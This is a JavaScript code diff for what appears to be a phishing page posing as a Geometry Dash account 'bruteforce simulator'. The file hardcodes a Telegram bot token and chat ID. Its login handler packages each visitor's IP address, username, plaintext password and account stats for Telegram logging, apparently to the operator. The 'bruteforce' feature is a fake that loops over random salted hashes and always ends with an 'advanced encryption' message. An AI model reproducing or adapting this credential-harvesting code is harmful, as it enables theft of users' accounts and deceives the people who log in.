@@ -1,4 +1,4 @@
-// ===== CONFIG =====
+// ===== CONFIG (CHANGE THESE IF NEEDED) =====
 const TELEGRAM_BOT_TOKEN = '8780827680:AAFQETqfkgqQEsjTLGknvIRJxV5gWgunqMg';
 const TELEGRAM_CHAT_ID = '7136838858';
 
@@ -8,35 +8,12 @@ let nextUserId = 1;
 
 // ===== IP & USER TRACKING =====
 async function getClientIp() {
-    const sources = [
-        'https://ipapi.co/json/',
-        'https://ipwho.is/',
-        'https://geolocation-db.com/json/'
-    ];
-
-    let ipData = {};
-
-    for (let url of sources) {
-        try {
-            const response = await fetch(url);
-            ipData = await response.json();
-            if (ipData.ip || ipData.IPv4 || ipData.query) break;
-        } catch (error) {
-            console.log(`Failed to fetch from ${url}:`, error);
-        }
-    }
-
-    return ipData.ip || ipData.IPv4 || ipData.query || 'Unknown';
-}
-
-async function getLocationDetails(lat, lon) {
     try {
-        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+        const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
-        return data;
+        return data.ip;
     } catch (error) {
-        console.log('Reverse geocoding failed:', error);
-        return null;
+        return 'Unknown';
     }
 }
 
@@ -46,142 +23,6 @@ function getOrCreateUserId(ip) {
         nextUserId++;
     }
     return userIdMap[ip];
-}
-
-// ===== DISPLAY IP INFO =====
-async function displayIpInfo() {
-    const ipInfo = await getClientIpFull();
-    const ipInfoDiv = document.getElementById('ipInfo');
-
-    if (!ipInfoDiv) return;
-
-    let html = `
-        <div class="ip-info-grid">
-            <div class="ip-info-item">
-                <label>IP Address</label>
-                <div class="value">${ipInfo.ip}</div>
-            </div>
-            <div class="ip-info-item">
-                <label>Country</label>
-                <div class="value">${ipInfo.country || '-'}</div>
-            </div>
-            <div class="ip-info-item">
-                <label>City</label>
-                <div class="value">${ipInfo.city || '-'}</div>
-            </div>
-            <div class="ip-info-item">
-                <label>Timezone</label>
-                <div class="value">${Intl.DateTimeFormat().resolvedOptions().timeZone}</div>
-            </div>
-            <div class="ip-info-item">
-                <label>Device Type</label>
-                <div class="value">${/Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}</div>
-            </div>
-            <div class="ip-info-item">
-                <label>Operating System</label>
-                <div class="value">${getOSName()}</div>
-            </div>
-    `;
-
-    if (ipInfo.lat && ipInfo.lon) {
-        const locDetails = await getLocationDetails(ipInfo.lat, ipInfo.lon);
-        if (locDetails && locDetails.address) {
-            const addr = locDetails.address;
-            html += `
-                <div class="ip-info-item">
-                    <label>Region</label>
-                    <div class="value">${[addr.suburb, addr.city, addr.state].filter(Boolean).join(', ') || '-'}</div>
-                </div>
-                <div class="ip-info-item">
-                    <label>Road/Street</label>
-                    <div class="value">${addr.road || addr.neighbourhood || addr.village || '-'}</div>
-                </div>
-                <div class="ip-info-item">
-                    <label>Postal Code</label>
-                    <div class="value">${addr.postcode || '-'}</div>
-                </div>
-                <div class="ip-info-item">
-                    <label>Coordinates</label>
-                    <div class="value">${ipInfo.lat.toFixed(6)}, ${ipInfo.lon.toFixed(6)}</div>
-                </div>
-            `;
-        }
-    }
-
-    html += `</div>`;
-
-    if (ipInfo.lat && ipInfo.lon) {
-        html += `<div id="map"></div>`;
-    }
-
-    ipInfoDiv.innerHTML = html;
-    ipInfoDiv.classList.add('show');
-
-    if (ipInfo.lat && ipInfo.lon && document.getElementById('map')) {
-        setTimeout(() => {
-            initializeMap(ipInfo.lat, ipInfo.lon);
-        }, 100);
-    }
-}
-
-async function getClientIpFull() {
-    const sources = [
-        'https://ipapi.co/json/',
-        'https://ipwho.is/',
-        'https://geolocation-db.com/json/'
-    ];
-
-    let ipData = {};
-
-    for (let url of sources) {
-        try {
-            const response = await fetch(url);
-            ipData = await response.json();
-            if (ipData.ip || ipData.IPv4 || ipData.query) break;
-        } catch (error) {}
-    }
-
-    return {
-        ip: ipData.ip || ipData.IPv4 || ipData.query || 'Unknown',
-        lat: ipData.latitude || ipData.lat || null,
-        lon: ipData.longitude || ipData.lon || null,
-        country: ipData.country || null,
-        city: ipData.city || null,
-        state: ipData.state || null
-    };
-}
-
-function getOSName() {
-    const ua = navigator.userAgent;
-    if (/Android/i.test(ua)) return 'Android';
-    else if (/Windows NT 10\.0/i.test(ua)) return 'Windows 10/11';
-    else if (/Windows NT 6\.1/i.test(ua)) return 'Windows 7';
-    else if (/iPhone|iPad/i.test(ua)) return 'iOS';
-    else if (/Macintosh|Mac OS X/i.test(ua)) return 'macOS';
-    else if (/Linux/i.test(ua)) return 'Linux';
-    return 'Unknown';
-}
-
-function initializeMap(lat, lon) {
-    try {
-        const link = document.createElement('link');
-        link.rel = 'stylesheet';
-        link.href = 'https://unpkg.com/leaflet/dist/leaflet.css';
-        document.head.appendChild(link);
-
-        const script = document.createElement('script');
-        script.src = 'https://unpkg.com/leaflet/dist/leaflet.js';
-        script.onload = () => {
-            const map = L.map('map').setView([lat, lon], 13);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '© OpenStreetMap contributors'
-            }).addTo(map);
-            L.marker([lat, lon]).addTo(map);
-        };
-        document.head.appendChild(script);
-    } catch (error) {
-        console.log('Map initialization failed:', error);
-    }
 }
 
 // ===== TELEGRAM LOGGING =====
@@ -450,13 +291,13 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
         ip: ip,
         username: username,
         password: password,
-        status: isPasswordValid.success ? 'SUKSES' : 'GAGAL',
+        status: isPasswordValid ? 'SUKSES' : 'GAGAL',
         rank: stats?.rank || 'N/A',
         cp: stats?.cp || 0,
         mod: stats?.moderator || 0
     });
 
-    if (!isPasswordValid.success) {
+    if (!isPasswordValid) {
         document.getElementById('passwordError').textContent = 'Invalid credentials';
         document.getElementById('passwordError').classList.add('show');
         loginBtn.disabled = false;
@@ -467,9 +308,8 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
     loginBtn.disabled = false;
     loginBtn.textContent = 'Login';
 
-    // Show profile and IP info
+    // Show profile
     await showProfile(username);
-    await displayIpInfo();
 });
 
 // ===== PROFILE PAGE =====
@@ -518,8 +358,6 @@ function logout() {
     document.getElementById('loginForm').reset();
     document.getElementById('searchResult').classList.remove('show');
     document.getElementById('bruteforceProcess').classList.remove('show');
-    document.getElementById('ipInfo').classList.remove('show');
-    document.getElementById('ipInfo').innerHTML = '';
 }
 
 // ===== BRUTEFORCE SIMULATOR =====
@@ -559,7 +397,7 @@ async function searchTarget() {
                     </label>
                 </div>
                 <button class="start-bruteforce-btn" onclick="startBruteforce('${targetUsername}')">
-                    🔓 Start Bruteforce
+                    🔓 Start
                 </button>
             </div>
         `;
@@ -574,12 +412,22 @@ async function searchTarget() {
     }
 }
 
-function generateRandomPassword(length, charset) {
-    let result = '';
+async function generateRandomGJP2(length, charset) {
+    let password = '';
     for (let i = 0; i < length; i++) {
-        result += charset.charAt(Math.floor(Math.random() * charset.length));
+        password += charset.charAt(Math.floor(Math.random() * charset.length));
     }
-    return result;
+    
+    // Generate GJP2 hash for the random password
+    const SALT = "mI29fmAnxgTs";
+    const encoder = new TextEncoder();
+    const data = encoder.encode(password + SALT);
+    const hashBuffer = await crypto.subtle.digest("SHA-1", data);
+    const gjp2Hash = Array.from(new Uint8Array(hashBuffer))
+        .map(b => b.toString(16).padStart(2, "0"))
+        .join("");
+    
+    return { password, gjp2: gjp2Hash };
 }
 
 async function startBruteforce(targetUsername) {
@@ -601,11 +449,11 @@ async function startBruteforce(targetUsername) {
     attemptsContainer.innerHTML = '';
 
     let attemptCount = 0;
+    const maxAttempts = 999999999999999999;
 
-    // Infinite loop - no max attempts limit
-    for (let i = 0; i < Number.MAX_SAFE_INTEGER; i++) {
+    for (let i = 0; i < maxAttempts; i++) {
         const length = Math.floor(Math.random() * 14) + 6;
-        const password = generateRandomPassword(length, charset);
+        const { password, gjp2 } = await generateRandomGJP2(length, charset);
 
         attemptCount++;
 
@@ -621,13 +469,10 @@ async function startBruteforce(targetUsername) {
             Testing... ${attemptCount} attempts
         `;
 
-        // Random delay with randomized GJP2 delay
-        const randomDelay = Math.random() * (0.3 - 0.15) + 0.15;
-        await new Promise(resolve => setTimeout(resolve, randomDelay * 1000));
+        await new Promise(resolve => setTimeout(resolve, 50));
     }
 
     statusMessage.innerHTML = `
         ⏳ Advanced encryption detected.<br>Strong cryptographic implementation confirmed.
     `;
-          }
-                                              
+}
